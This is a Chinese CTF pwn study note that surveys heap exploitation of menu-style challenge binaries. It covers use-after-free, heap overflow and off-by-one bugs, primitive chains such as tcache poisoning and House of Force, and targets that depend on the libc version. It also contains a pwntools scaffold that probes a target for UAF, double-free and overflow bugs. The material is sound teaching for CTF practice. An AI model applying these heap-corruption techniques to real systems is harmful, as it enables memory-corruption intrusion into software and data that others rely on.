---
title: UAF 与堆溢出综述（题型 / 原语 / 利用路线图）
category: pwn
tags: [UAF, heap overflow, off-by-one, 堆原语, 综述]
signals: [菜单式 add/del/edit/show, free 后指针未清, edit 长度不校验, 存在 off-by-one 或 off-by-null, 相邻 chunk 可重叠, 堆题但不知从何下手]
difficulty: medium
source: "CTF-Wiki Use After Free / Heap Overflow / Off-By-One / how2heap"
tools: [pwntools, gdb, pwndbg, heapviz]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 菜单式堆管理：`add / delete / edit / show`，四件套齐全或只有其中几个。
- `delete` 后没有 `ptr = NULL`，`show`/`edit` 仍能访问 —— **Use After Free**。
- `edit` 的读入长度由用户指定，且大于 `chunk_size` —— **Heap Overflow**。
- `read(0, buf, size)` 里 `size = malloc_size + 1` 或 `strcpy` 到堆 —— **Off-by-One / Off-by-Null**。
- 程序逻辑里有 `printf("%s", ptr)` 但从不释放相邻块 —— 说明出题人想让你做重叠。

## 二、原理

### 三类根因

| 类型 | 根因 | 直接后果 |
|---|---|---|
| UAF | `free` 后指针未失效 | 可读写已 free chunk 的 fd/bk、可再次 free（double free） |
| Heap Overflow | 写入长度 > 分配长度 | 覆盖相邻 chunk 的 header / 内容 |
| Off-by-One | 长度差 1 | 覆盖相邻 chunk 的 `size` 低字节（改 `PREV_INUSE`）或 `prev_size` |

### 常见原语链

```text
UAF  ──┬─→ tcache poisoning（改 next）──→ 任意地址分配 ─→ 写 hook / _IO_FILE / 栈
       ├─→ double free ──→ 同一 chunk 两指针 ──→ 重叠 / 篡改
       └─→ show 读出 fd/bk ──→ libc / heap 泄露

Overflow ─┬─→ 改相邻 chunk size ──→ overlapping chunks / chunk extend
          ├─→ 改 top->size ──→ House of Force
          └─→ 改相邻 chunk 的 prev_size + 清 P 位 ──→ unlink / House of Einherjar

Off-by-Null ─→ 清 `PREV_INUSE` ─→ 合并伪造的 prev chunk ──→ overlapping
```

### 三大必背

1. **chunk 结构**（64 位）：`prev_size(8) | size(8) | user data`。`size` 低 3 位是 `PREV_INUSE / IS_MMAPPED / NON_MAIN_ARENA`。
2. **bin 优先级**：`tcache`（<=0x408）→ `fastbin`（<=0x80）→ `smallbin` / `unsorted` → `largebin`。
3. **hook 存在性**：`__malloc_hook` / `__free_hook` 在 2.34 被删除。

## 三、checksec 判读与利用思路

```text
RELRO: Full/Partial  Canary: 无关  NX: enabled  PIE: enabled
```

堆题的**四步法**（任何堆题都按这个顺序推）：

1. **定漏洞**：UAF / 溢出 / off-by-one / 整数溢出 / 未初始化。
2. **定原语**：能读吗（show）？能写吗（edit）？能连 free 吗？
3. **定目标**：
   - libc ≤ 2.31 → `__free_hook` / `__malloc_hook`
   - libc 2.34 ~ 2.41 → `_IO_2_1_stdout_` / `_IO_list_all` / exit handler / 栈
4. **定布局**：按 libc 版本用 tcache / fastbin / unsorted / large bin 的具体手法（见对应篇章）。

一张速查表：

| 有 UAF + show | 有 UAF + edit | 有溢出 |
|---|---|---|
| 先泄露 libc/heap | 直接打 tcache poisoning | 改 size 造 overlapping |
| 再改 hook | safe-linking 需 mangle | 或 House of Force |

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# 堆题通用脚手架：菜单封装 + 环境判定 + 自动原型测试
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

class Menus:
    """把题目的 add/del/edit/show 统一成方法，改这里适配不同题"""
    def __init__(self, p, add_cmd=b"1", del_cmd=b"2", edit_cmd=b"3",
                 show_cmd=b"4", prompt=b"> "):
        self.p, self.prompt = p, prompt
        self.cmd = dict(add=add_cmd, delete=del_cmd, edit=edit_cmd, show=show_cmd)
    # 用法：m.add(0x60, b"AAAA"); m.show(0) -> 返回该行输出

    def add(self, size, data=b"", idx=None):
        p = self.p
        p.sendlineafter(self.prompt, self.cmd["add"])
        p.sendlineafter(b"size", str(size).encode())
        if idx is not None:
            p.sendlineafter(b"idx", str(idx).encode())
        p.sendafter(b"data", data)

    def delete(self, idx):
        self.p.sendlineafter(self.prompt, self.cmd["delete"])
        self.p.sendlineafter(b"idx", str(idx).encode())

    def edit(self, idx, data):
        self.p.sendlineafter(self.prompt, self.cmd["edit"])
        self.p.sendlineafter(b"idx", str(idx).encode())
        self.p.sendafter(b"data", data)

    def show(self, idx):
        self.p.sendlineafter(self.prompt, self.cmd["show"])
        self.p.sendlineafter(b"idx", str(idx).encode())
        return self.p.recvline()

# ---------- 原型测试：确认题目到底有什么漏洞 ----------
def probe_uaf(m, probe_size=0x60):
    m.add(probe_size, b"A" * 8); m.delete(0)
    try:
        out = m.show(0)                  # free 后还能 show => UAF 读
        log.success(f"UAF read: {out[:8]!r}")
    except EOFError:
        log.warning("no UAF read")
    try:
        m.edit(0, b"B" * 8)              # free 后还能 edit => UAF 写
        log.success("UAF write OK")
    except EOFError:
        log.warning("no UAF write")

def probe_double_free(m, probe_size=0x60):
    m.add(probe_size, b"A" * 8); m.add(probe_size, b"B" * 8)
    m.delete(0); m.delete(1)
    try:
        m.delete(0)                      # 第二次 free 0
        log.success("double free OK")
    except EOFError:
        log.warning("double free blocked")

def probe_overflow(m, alloc=0x20, write_len=0x40):
    m.add(alloc, b"A" * alloc); m.add(alloc, b"B" * alloc)
    try:
        m.edit(0, b"C" * write_len)       # 写超长，覆盖 1 的 header
        m.show(1)
        log.success("heap overflow OK")
    except EOFError:
        log.warning("no overflow")

# ---------- libc 版本能力矩阵 ----------
def libc_caps(libc):
    caps = {}
    caps["version"] = libc.version
    for s in ("__free_hook", "__malloc_hook", "_IO_list_all", "_IO_2_1_stdout_",
              "system", "environ"):
        caps[s] = hex(libc.sym[s]) if s in libc.sym else "ABSENT"
    caps["safe_linking"] = tuple(map(int, (libc.version or (0, 0)))) >= (2, 32)
    for k, v in caps.items():
        info(f"{k:22s} = {v}")
    return caps

if __name__ == "__main__":
    p = start()
    m = Menus(p)
    libc_caps(ELF(args.LIBC or "./libc.so.6", checksec=False))
    for fn in (probe_uaf, probe_double_free, probe_overflow):
        try:
            fn(m)
        except Exception as e:
            warn(f"{fn.__name__}: {e}")
        p.close(); p = start(); m = Menus(p)
    p.interactive()
```

堆布局可视化（本地调试必做）：

```bash
# pwndbg 里最直观
#   heap              列出所有 chunk
#   bins              列出各 bin
#   vis_heap_chunks   图形化
gdb -q ./pwn -ex 'b *vuln' -ex r -ex 'heap' -ex 'bins'
```

## 五、常见坑 / 变体

- **`free` 前检查 `inuse`**：很多题在 `free` 时置 `ptr[idx] = NULL`，UAF 就没了，转攻溢出。
- **`edit` 的长度由 `strlen` 决定**：无法写入 `\x00`，限制伪造 header 的能力，改用 `read` 路径。
- **`malloc` 大小被对齐**：`malloc(0x18)` 实际 chunk 是 `0x20`，写 payload 时按 `chunksize` 算。
- **tcache 先于 fastbin**：小 chunk free 一定进 tcache（2.26+），想做 fastbin 必须先填满 7 个。
- **off-by-null 需要 `prev_size` 配合**：2.29+ 有 `prev_size` 与 `size` 一致性校验，需伪造合理的 `prev_size`。
- **`heap` 基址泄露**：2.32+ 的 safe-linking 强制需要 heap 地址，先 `show` 一个 tcache chunk 反推。
- **题目 fork**：`process()` 每次地址不同，堆题一般 `remote` 打，本地用 `socat`。

## 六、参考来源

- [CTF-Wiki: Use After Free](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/)
- [CTF-Wiki: 堆溢出](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/)
- [CTF-Wiki: 堆中的 Off-By-One](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/)
- [CTF-Wiki: Chunk Extend and Overlapping](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/)
- [CTF-Wiki: Unlink](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/)
- [how2heap 仓库（全部 demo 一览）](https://github.com/shellphish/how2heap)
- [ir0nstone: Heap Overflow](https://ir0nstone.gitbook.io/notes/binexp/heap/heap-overflow)
